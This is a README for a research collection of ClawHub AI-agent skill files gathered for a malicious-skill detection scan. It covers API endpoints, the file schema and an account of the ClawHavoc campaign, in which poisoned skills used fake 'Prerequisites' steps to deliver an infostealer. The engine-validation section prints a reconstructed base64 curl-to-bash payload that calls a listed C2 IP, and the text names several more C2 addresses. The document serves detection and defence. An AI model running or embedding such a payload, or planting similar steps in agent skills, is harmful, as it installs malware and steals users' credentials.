# ClawHub Wild-Scan Corpus

Raw skill data pulled from ClawHub (clawhub.ai), one of the largest AI-agent
skill marketplaces, for the wild-scan pipeline. This is **collection only** —
these files are inputs for a later scan pass (run the ATR engine over each
file's `content` field), not proposals or rules. Nothing here has been
reviewed or classified as malicious/benign yet.

## Source

- Site: https://clawhub.ai (canonical; `clawhub.com` 307-redirects here)
- List endpoint: `GET https://clawhub.ai/api/v1/skills?limit=<n>&cursor=<opaque>`
  — cursor-paginated, effective page size capped by the server around
  ~190-200 items regardless of a larger `limit`.
- Detail endpoint: `GET https://clawhub.ai/api/v1/skills/<slug>` — returns
  `{ skill, latestVersion, metadata, owner, moderation }`. `skill.description`
  here is the **full raw SKILL.md source** (YAML frontmatter + markdown
  body); the list endpoint's `description` field is only a short duplicate
  of `summary`, so the detail call is required to get real scannable
  content. `owner.handle` (the publisher account) is also only present in
  the detail response.
- Ambiguous slugs: a nontrivial number of slugs are published by more than
  one account (e.g. `session-cleanup`, `pyzhihu-cli`). The detail endpoint
  returns `HTTP 409 {"code":"AMBIGUOUS_SKILL_SLUG", matches:[...]}` in that
  case; disambiguate by re-requesting with `?owner=<ownerHandle>`. The sync
  script does this automatically and writes one file per owner, named
  `<owner>--<slug>.json` instead of `<slug>.json`.
- `robots.txt` disallows crawling `/api/` for search-engine crawlers but
  explicitly allows `/v1/feeds/skills` and `/v1/feeds/plugins`. Those feed
  endpoints were checked and only cover a small curated set of "verified
  official publisher" skills — not the full catalog — so they can't serve
  this collection's purpose. `/api/v1/skills` is served with
  `access-control-allow-origin: *` and a generous published rate limit
  (`ratelimit-limit: 3000` per short window) — the same endpoint the site's
  own frontend calls. `data/clawhub-scan/clawhub-registry.json` elsewhere in
  this repo (committed 2026-03-26, predates this collection) was already
  built from this same API. The sync script still self-throttles well under
  the published limit (200ms between requests by default) out of caution.

Full endpoint/schema notes: see the header comment in
`scripts/sync-clawhub.ts`.

## IMPORTANT: catalog size is much larger than assumed

The task that produced this collection assumed a "post-cleanup" catalog of
~3,286 skills. That figure is **stale**. A live count on 2026-07-12 passed
27,800+ unique slugs by page 142 of the list endpoint and was still
climbing when the counting run was stopped (list phase alone, no detail
fetches) — the real current catalog is very likely in the 30,000-40,000+
range and growing daily (skills seen with `createdAt` timestamps from
the same day as this pull). Do not cite "~3,286" anywhere; re-run
`npx tsx scripts/sync-clawhub.ts` (dry-run, list-only, no `--write`) to get
a fresh live count before quoting a number externally.

## This collection (initial pull)

- Pull date: 2026-07-12
- Mode: bounded real pull, `--limit 3500` (first ~3,500 slugs in the list
  endpoint's natural pagination order, which is not sorted by popularity —
  see `stats.downloads` / `stats.installs` in each file to prioritize scan
  order yourself)
- This is a **partial** snapshot of a much larger live catalog (see above),
  not the full ~30-40K. It exists to validate the collection pipeline
  end-to-end at real scale and to seed the scan queue.
- File count and exact numbers: see the script's own summary JSON printed
  on the run (`::clawhub-summary::{...}`) — do not hardcode a count here,
  it will drift. Run `find data/wild-scan/clawhub -name '*.json' ! -name
  README.md | wc -l` for the current on-disk count.

### Resuming / completing the pull

The script is idempotent by design: it skips any slug whose output file
already exists unless `--force` is passed. To continue collecting the rest
of the catalog in a later session, just re-run without `--limit` (or with a
higher one):

```
npx tsx scripts/sync-clawhub.ts --write
```

This will re-walk the list phase (cheap — pagination only) and then only
fetch detail for slugs not yet on disk. A full pull of the entire live
catalog at the default 200ms delay is a multi-hour operation (tens of
thousands of detail requests) — run it as a background/long-lived task, not
inline.

## File schema

One JSON file per (slug) or per (owner, slug) pair when ambiguous. Fields:

```
source           "clawhub"
api_shape        schema-version tag for this collector
slug             ClawHub skill slug
display_name     human-readable title
publisher        { handle, display_name, user_id } — the account that
                 published this skill (null fields if the detail call
                 somehow lacked owner data)
summary          short marketing summary (from the API)
description      best-effort parsed short description (from SKILL.md
                 frontmatter `description:`, including literal/folded
                 YAML block-scalar forms); falls back to `summary`
content          FULL raw SKILL.md source (frontmatter + body) — this is
                 the field a scan pass should run detection rules against
category         best-effort parsed from SKILL.md frontmatter `category:`;
                 null if absent (loose/non-standard frontmatter is common)
tags             best-effort parsed from frontmatter `tags:`; falls back
                 to `topics` if frontmatter had none
topics           raw `topics` array from the API
latest_version   semver string of the latest published version
license          SPDX-ish string or null
stats            { downloads, installs, stars, versions, comments } — use
                 downloads/installs to prioritize which skills to scan
                 first
created_at       ISO 8601, skill first published
updated_at       ISO 8601, last version bump
fetched_at       ISO 8601, when THIS script pulled the record
source_url       best-effort browsable URL (https://clawhub.ai/<owner>/
                 skills/<slug>) — not independently verified as a live
                 route, since clawhub.ai is a client-rendered SPA
```

## ClawHavoc grounding (why ClawHub, and what to validate against)

ClawHub is a strong scan target in part because of a confirmed real
supply-chain attack: "ClawHavoc", reported by Koi Security (Oren Yomtov)
in Feb 2026 — https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting
(corroborated by TheHackerNews, Trend Micro, and others). An initial audit
on 2026-02-01 found 341 malicious skills out of 2,857 scanned (11.9%),
growing to 824 by 2026-02-16 as the registry passed 10,700 skills. Most
malicious skills used a fake "Prerequisites" step in otherwise
professional-looking skills (crypto wallet trackers, YouTube utilities,
Polymarket bots, ClawHub-typosquat CLIs, etc.) to socially-engineer a
base64-obfuscated `curl | bash` chain that installed the Atomic macOS
Stealer (AMOS) infostealer, with C2 IPs including `91.92.242.30`,
`95.92.242.30`, `96.92.242.30`, `202.161.50.59`, `54.91.154.110`. ClawHub
added VirusTotal-based scanning + removal on 2026-02-07.

**Note on task-provided background:** the brief for this collection cited
"12 compromised publisher accounts / 1,184 malicious skills" for
ClawHavoc. That figure was **not corroborated** by the Koi Security
write-up or its secondary coverage (which report 341 -> 824, not 1,184,
and do not mention a "12 accounts" figure). Treat "1,184 / 12 accounts" as
unverified pending a primary source.

None of the ~335 specific ClawHavoc-campaign slugs enumerated in the Koi
write-up (the `auto-updater-*`, `clawhub-*` typosquat, `phantom-*`,
`polymarket-*`, `solana-*`, `wallet-tracker-*`, `x-trends-*`,
`yahoo-finance-*`, `youtube-summarize-*` families, etc.) were spot-checked
against this pull's slug list; a full cross-check against the current
catalog is a good follow-up once the full catalog is collected, to confirm
post-cleanup removal held.

### Engine validation

`rules/skill-compromise/ATR-2026-00121-skill-dangerous-script.yaml` already
encodes ClawHavoc IOCs (the exact C2 IP `91.92.242.30`, the base64-curl-bash
chain, password-protected ZIP evasion) as `test_cases`. A reconstructed
representative payload modeled on the Koi write-up's decoded example —

```
echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC83YnV1MjRs' | base64 -D | bash
```

— framed inside a fake "Prerequisites" section of a `solana-wallet-tracker`
SKILL.md (matching the real campaign's social-engineering pattern), was
scanned with `node dist/cli.js scan-skill` against the 747-rule engine
built from this branch. It triggered 3 rules, including the one built for
this exact campaign:

- `ATR-2026-00220` — Base64 Encoded Remote Code Execution via Raw IP (critical, confidence 0.92)
- `ATR-2026-00121` — Malicious Code in Skill Package (critical, confidence 0.9125) — this is the rule whose description explicitly names ClawHavoc
- `ATR-2026-00225` — Hardcoded Suspicious IP Address in Skill Content (high, confidence 0.92)

This confirms the current ATR engine would have flagged the ClawHavoc
attack pattern.
